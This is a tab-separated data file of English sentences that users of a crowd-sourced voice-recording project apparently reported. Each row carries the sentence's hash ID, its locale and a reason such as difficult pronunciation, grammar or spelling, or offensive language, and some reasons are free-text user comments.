sentence	sentence_id	locale	reason
Espionage and intrigue were often featured instead of straightforward battles.	12d2daf4fdda7b062678beda6ea76bf50bf1103c7d8cce4c58d089f2aad89d7e	en	different-language
Espionage and intrigue were often featured instead of straightforward battles.	12d2daf4fdda7b062678beda6ea76bf50bf1103c7d8cce4c58d089f2aad89d7e	en	difficult-pronounce
Espionage and intrigue were often featured instead of straightforward battles.	12d2daf4fdda7b062678beda6ea76bf50bf1103c7d8cce4c58d089f2aad89d7e	en	FRF;D''FVVVFBLSFDLKLNMSPLDDOFL\
FFCDFKGVGOF; KDVJUL;DH
The chelifores of the Pycnogonida may be homologous to chelicerae.	1254950a29c2a2473fd9531ddab789bdae0c803ab4cb33f9b0299e4995512f6b	en	difficult-pronounce
On rollover of an individual result a bunch of red lines connected related links.	130e28dc7c28044d3fba67c84a3cafd8aa0de6acd2729a96615071e4d24b4151	en	offensive-language
A mistral gagnant was a kind of candy and lottery.	13a08c305dc3b93db98e04d8f674fc97fb9545c03fc9169469d3e55e9db9bd44	en	different-language
A mistral gagnant was a kind of candy and lottery.	13a08c305dc3b93db98e04d8f674fc97fb9545c03fc9169469d3e55e9db9bd44	en	difficult-pronounce
There is also the city of Oak Grove in Jackson and Lafayette Counties.	142bb5478a9b9bb14b00f69e71b26fe9caeb8fa3ac91da3f671de237bec36ffc	en	difficult-pronounce
The Senior School is divided into five separate houses.	1427b6ac2e1f4e5d7d22d9ccb7aa9bcc38e512de596465deb14eff62f114a1fb	en	offensive-language
The Senior School is divided into five separate houses.	1427b6ac2e1f4e5d7d22d9ccb7aa9bcc38e512de596465deb14eff62f114a1fb	en	grammar-or-spelling
The Senior School is divided into five separate houses.	1427b6ac2e1f4e5d7d22d9ccb7aa9bcc38e512de596465deb14eff62f114a1fb	en	different-language
The Senior School is divided into five separate houses.	1427b6ac2e1f4e5d7d22d9ccb7aa9bcc38e512de596465deb14eff62f114a1fb	en	difficult-pronounce
The Senior School is divided into five separate houses.	1427b6ac2e1f4e5d7d22d9ccb7aa9bcc38e512de596465deb14eff62f114a1fb	en	Redeculass

However, the new phenomenon of tussentaal is becoming widespread.	148ce6803a8f3fff231523af2324023404276c4650f87ca211434a88fefd9fce	en	difficult-pronounce
The Maasvlakte features various big companies and some smaller ones.	14914323416b826aa464ad6d74da3d7f1a914e382e01ba40fc085e0b9f505573	en	difficult-pronounce
The elders used to sacrifice to the Askafroa on the morning of Ash Wednesday.	14a92a2707ebfce8663fff79b259134f2f6294bff682fa557226a59a71104e92	en	difficult-pronounce
The trestle is long and high.	14b29fc7e643daa13c072dd12751452c98c2450c34bed6131b85925bd9ab458f	en	offensive-language
However, some roads are maintained by the federal government.	14d0c3d7d924d1150ae737de5d902560b3345ae0be1e55011959e7a43761046a	en	grammar-or-spelling
However, some roads are maintained by the federal government.	14d0c3d7d924d1150ae737de5d902560b3345ae0be1e55011959e7a43761046a	en	different-language
However, some roads are maintained by the federal government.	14d0c3d7d924d1150ae737de5d902560b3345ae0be1e55011959e7a43761046a	en	difficult-pronounce
However, some roads are maintained by the federal government.	14d0c3d7d924d1150ae737de5d902560b3345ae0be1e55011959e7a43761046a	en	0964341800

Sam Steinberg's Ivanhoe Corporation is a shareholder of the mall.	14cfe6ed3233e530a2d34bfde48e016d4be2509ac78f5abd942e06757043fbec	en	grammar-or-spelling
Hence the hyperbolic paraboloid is a conoid.	147dda7f67de8131b5551300d171917bb6f0ec71ca6288202a5211c5ebe97880	en	grammar-or-spelling
The field is traditionally set the Sunday before Thanksgiving and play begins that weekend.	14cb44cfdc7d9fcd7db540535b9b0d48fcc8be76ae10549eb25e42dd94b195c3	en	grammar-or-spelling
S. A. Stanton in command, and was assigned to the Asiatic Fleet.	14d1fd478903127a3c04e7f4423311d502ee962998d999807b56e27111ca7f56	en	grammar-or-spelling
Therefore, some believe that the word Kranai literary means "rocky, rock".	1515e577dd48a0b8471e996293b11f3ac252bdceefba5955e23f9b588cef2cd7	en	grammar-or-spelling
Another climber was slipped and fell on the descent and died during the night.	1514ea9aa77ff5bad189b1ecd101b8509d7f97853260320323878e18581a41a3	en	grammar-or-spelling
Euler's rule creates additional amicable pairs for with no others being known.	150ee43076c5a6dece95aebe4d74586201c8bf60374f7196f868966949393e91	en	grammar-or-spelling
It runs for in an extended loop through Powys between Knighton and Welshpool.	1516de3a4c845996ef25cd8d7592d9ba7ef4501607a8810fa7e43b9f3f3b460c	en	grammar-or-spelling
Euskotren Trena connects the town directly with Bilbao, Guernica, Amorebieta-Etxano, Biscay and Gipuzkoa.	14e29d70c4c461a3776cc2ae8ae24d1a899123319efbe17867d8c073327ea15b	en	Page keeps saying "The recording was too long." It wasn't.
See also McCloud versus State, Ariz. Dep't of Pub.	14f70c8d1bdb26715edc9334f38228ced995c0ebe67a9dbefb588424318b8379	en	difficult-pronounce
The committee's purpose: communicate circumstances and revolutionary sentiment among the colonies.	14e800ee07701c7ab57f0f30d47ae2df64105385ae555d08874e3da2983d0cbb	en	difficult-pronounce
The committee's purpose: communicate circumstances and revolutionary sentiment among the colonies.	14e800ee07701c7ab57f0f30d47ae2df64105385ae555d08874e3da2983d0cbb	en	offensive-language
The committee's purpose: communicate circumstances and revolutionary sentiment among the colonies.	14e800ee07701c7ab57f0f30d47ae2df64105385ae555d08874e3da2983d0cbb	en	grammar-or-spelling
The committee's purpose: communicate circumstances and revolutionary sentiment among the colonies.	14e800ee07701c7ab57f0f30d47ae2df64105385ae555d08874e3da2983d0cbb	en	different-language
The committee's purpose: communicate circumstances and revolutionary sentiment among the colonies.	14e800ee07701c7ab57f0f30d47ae2df64105385ae555d08874e3da2983d0cbb	en	What  i’m speaking.
Delta Connection flew to Minneapolis-St.	158617caae400998ffc1d8dfe044ecb3e0f48b5929a757a67a0a9861bcad05fc	en	Incomplete.
During the Tour she Datet Jorg Weisselberg.	15aa48111d9aeca1fe2bace8440873cc1f64dedf092b18d3b925518854af2efa	en	grammar-or-spelling
Additional awards of are denoted by service stars.	15b6c99dce88c047fe59cf20322fcd73d5542933403384d2d811396b39a8f2b6	en	grammar-or-spelling
It is similar to the American term 'midway'.	15af7052fed72e56ada9fd9ecbb301e2798bfa5b766e6a0b470a614cab73d758	en	offensive-language
There was no government or military official participation in the ceremony.	15fc9937b9f51396586b371a80ed964f4eadb96f9404f67c75d0920f8c1d996c	en	Microphone not working
He played an active part the Stop the War Coalition.	162e44651fc5940d39271d073a35645632748f2c894b45d6847cd404cb46e384	en	grammar-or-spelling
The main turbines developed on "Benham"'s trials and were manufactured by Westinghouse.	165db9754ac9513afdc511b03b128d15ab8744dc3183fb1e0c0088b14ffd7f53	en	grammar-or-spelling
Before meeting with "Virginia", the schooner recaptured a Baltimore sloop taken earlier.	1646e9d921e14c667002ef0006394363b9da643b82311867ce75dad0a51702d4	en	grammar-or-spelling
Bundesliga to the Regionalliga.	165d9d44a87a9d73c2b66ae7e7c473813d31b416b1ba040c7379bc4adbeee962	en	difficult-pronounce
Decidedly it was the right scrip for his pilgrimage.	16640bac954fe75708051aaf1446c90520e4cf9554996c78aa571738d9fef0d9	en	different-language
While at Dartmouth, be became a brother of Theta Delta Chi.	166e2c1d79b669e91050f45342cb8318bfe328dd0398b0eca3175a6841c9cdc5	en	grammar-or-spelling
Brodick Castle is a former residence of the Dukes of Hamilton.	168bd1e2ed5a9a31f51800d4a05e5530f0540df7d689d486706942a73334b190	en	difficult-pronounce
The restaurant's chef now is Oliver Kienast.	168e6213fd820971dc1989e90459afdd2253e5fbdce85b729479a2c90beab932	en	difficult-pronounce
Blyde means "glad" or "happy" in Dutch, a name derived from a voortrekkers' expedition.	16506fd9de2f3dd11254cdaf97767b4795e5b52caae8d3aa44749563743d46b5	en	difficult-pronounce
Another theory is that it comes from the Russian word for a merchant, "kupets".	1686a4be3417330b69036ed8ab2c020a702fe77aef74b083b5b0e97e76119230	en	different-language
Balgowlah's main commercial area is located on Condamine Street and Sydney Road.	1691ff0d96d5dc90e0f8620f2a9738a1cf69fc96039026f6a490011622dbd3c2	en	difficult-pronounce
The Spanish toys were called Jadali-Metamol.	1672982194531bfba065626446789430b15ab083781b059deca99f2b68ac01c1	en	difficult-pronounce
Khadakpurna, Katepurna, referred to as Purna.	169082793980f828e538629e519627af1aba4c6e764b2b853e3b9c72bdf81edf	en	difficult-pronounce
Because of this; "Swing" was certified as a platinum single in the United States.	16a665b862dd9a9b1afbe5dde2c4bc0353f532e88830257f21ab9e26d4283526	en	grammar-or-spelling
Korsun-Shevchenkivskyi is twinned with Gifhorn, Germany.	16a0627901162fa6eedb1067d738244996f693f0f31c593fb598e6acd1633c27	en	difficult-pronounce
The City of Belgarde, its departments and communal services helped organize the event.	167fd3d0e76914b1a714f4b0fba5f7cfe2aca737435635878bf866051b80e36c	en	grammar-or-spelling
Podzols cover about worldwide and are usually found under sclerophyllous woody vegetation.	169e33e7eb82095d9894cbffb6cd8a17674f6305ba34d671b81faf0f77d1793d	en	difficult-pronounce
He took a very an active interest in public affairs.	16ab867909f4c33de320beefd306a497ba4cddb0c33baa897985cc77e782f6a3	en	grammar-or-spelling
It measures in diameter, and in height.	169a9cd3b26aaa5b2ec16dc545d6a3a87e74c72b308f1362de3708eee2b75150	en	grammar-or-spelling
Podzols cover about worldwide and are usually found under sclerophyllous woody vegetation.	169e33e7eb82095d9894cbffb6cd8a17674f6305ba34d671b81faf0f77d1793d	en	offensive-language
Podzols cover about worldwide and are usually found under sclerophyllous woody vegetation.	169e33e7eb82095d9894cbffb6cd8a17674f6305ba34d671b81faf0f77d1793d	en	grammar-or-spelling
Its length is and it is the second longest river bridge in India.	16dc3bac0f47d5e64be469cb10e772d7687b82cf6f21720f9a9773b7051df1f1	en	grammar-or-spelling
Its length is and it is the second longest river bridge in India.	16dc3bac0f47d5e64be469cb10e772d7687b82cf6f21720f9a9773b7051df1f1	en	grammar-or-spelling
Imam Abu Dawud was a follower of Hanbali although some have consider him Shafi.	16d72d11bdb805af5b17a71cb50364ddcca076c8fcdd4b397bef5003c50e7841	en	grammar-or-spelling
A semiweekly hack line runed from Bellefontaine to Anna Station, via Lewistown.	16d90322e0f84bcfa217df7410ff2a33e3114c28c1f1aba32b2fa11007d72549	en	grammar-or-spelling
A day school that is located less than from Central London.	16c6990286f751ed00226a4397e0a4045debce3126b5c3654ced6f57cbd7d1fe	en	grammar-or-spelling
A semiweekly hack line runed from Bellefontaine to Anna Station, via Lewistown.	16d90322e0f84bcfa217df7410ff2a33e3114c28c1f1aba32b2fa11007d72549	en	grammar-or-spelling
Imam Abu Dawud was a follower of Hanbali although some have consider him Shafi.	16d72d11bdb805af5b17a71cb50364ddcca076c8fcdd4b397bef5003c50e7841	en	grammar-or-spelling
His film roles including Mad Max Beyond Thunderdome and Crackerjack.	170d5651cbe63a66cb7550298f7fa2e0038f6f4a2e0cdf58c17adc4c1fbdbe2d	en	grammar-or-spelling
The monomeric AuF molecule has been detected in the gas phase.	170e036f451b753c5ca3082aab1beab00aaf919f80bdacf3d03009be7e37861e	en	Not sure how you would want AuF pronounced - it would normally be gold flouride if I was talking to a chemist, but I doubt many "listeners" would be able to confirm this.
Interstate markers for three-digit routes are wider shields, and respectively.	16f651427b955c1aeb6cd1bf12a8b03aaa1014a2ed519591dd3687d5ce8e76b3	en	grammar-or-spelling
Also during the month referred to the forbidding of war.	170eb639e1eafc736665f389b2c969ef48443c4181052033705583fdd7139bb5	en	grammar-or-spelling
Through the later medieval period, Rambervillers belonged to the Bishops opf Metz.	16fdc6b40cd7b59ffb52734339a5b26bcdd66b0bd34448d8496ef04ea37118ba	en	grammar-or-spelling
In the first round, Tien's voice began to crack while singing "Return Home".	1714ce7785228137d6f060e4e51b0d3634ca275581e96ecddaeff2359da26a29	en	difficult-pronounce
Zain is an Ismaili Muslim, a minority group in the Shia Sect of Islam.	170a1a5e279e8adb72837e9d227292f98df0f2c78db62c3e0458b1e18125ce51	en	difficult-pronounce
The writer John Mulvey Ousley was of a later generation of the same family.	172a76182f00f85a46d3dfcde304984384d62f562bd7b3aad66331946025797e	en	difficult-pronounce
With her son, she competed the hijra and was reconnected with her husband.	1719eee513b6edf829ef04fb5f111af7720b942338752fedbefb69858565fc4c	en	difficult-pronounce
In the lawsuit, Dickson claimed that William J.	17247d11e16dc2856ba0368a6eebf5159e84164383f8a78fad06943fed10ef94	en	grammar-or-spelling
In the lawsuit, Dickson claimed that William J.	17247d11e16dc2856ba0368a6eebf5159e84164383f8a78fad06943fed10ef94	en	grammar-or-spelling
Trenches were dug amind the hills.	17471e007995b0f57e12055d853650a5bd6a8bf44c500198625b03ef941d81c3	en	grammar-or-spelling
With a weight of the statue rests on a pedestal of white Seravezza marble.	1742fb1305af6e7c848f42a21046b391c0adf35ae130c8334eed5cab04d60b48	en	grammar-or-spelling
The pseudobulb stays dormant, till a new one starts to develop.	175c07b8f6dd64a3076e09481064ab752d0d7116ede2e5425417ee4c0f12d080	en	offensive-language
Writers of the Kailyard school included J. M. Barrie, Ian Maclaren, J. J.	17456cfa6c4b0268dc2d39230585a0785eb99341f40e3aec18424c4441c12aea	en	grammar-or-spelling
The Slavonska Avenue intersects Trnje.	1711b7a38664b6bef5aa478509c334027e860781f52886ea8870c1372ce9c410	en	difficult-pronounce
The pathway runs for along the river towards Rockland Lake State Park.	16f08bf1b80df226e194eb96f0125fe112c27b57480279f0db4ffe61768f498f	en	grammar-or-spelling
The pathway runs for along the river towards Rockland Lake State Park.	16f08bf1b80df226e194eb96f0125fe112c27b57480279f0db4ffe61768f498f	en	grammar-or-spelling
He is a lecturer in at the University of Hong Kong.	175ede12b6dbc217203af37878be87918b5eaa89cc0b122394375b31f032e098	en	grammar-or-spelling
Several grocers and rest stops were built along this intersection, also.	177781b856755daeed97c8487d1e09f1644f90b6a7af6c482cd4ebc0600dbae0	en	grammar-or-spelling
Draga was the sixth of seven siblings.	176e493b099fef2ce3048e0b118e2483fca59daa3c396969564d1decfb66e898	en	grammar-or-spelling
In its heyday celebrations, socials, and gatherings where held continuously.	1769392895c9d3f85f739b667e6d6920689d886120d1851073cd211f7d7dcfe6	en	grammar-or-spelling
This accompanyes the modell of a Stone I have lately seene; itt weighs Mang.	177ba892b3c64065e0dad345dd0fc7a33a2fdf49571eae4732bce5becf1175a3	en	different-language
The company produces range of light sport aircraft, training and advanced ultralight aircraft.	177c2e667df2a5521d3fe94f1a5dcd86bfcd8c58174352522dffb9a918f17b93	en	grammar-or-spelling
This accompanyes the modell of a Stone I have lately seene; itt weighs Mang.	177ba892b3c64065e0dad345dd0fc7a33a2fdf49571eae4732bce5becf1175a3	en	difficult-pronounce
Writers of the Kailyard school included J. M. Barrie, Ian Maclaren, J. J.	17456cfa6c4b0268dc2d39230585a0785eb99341f40e3aec18424c4441c12aea	en	grammar-or-spelling
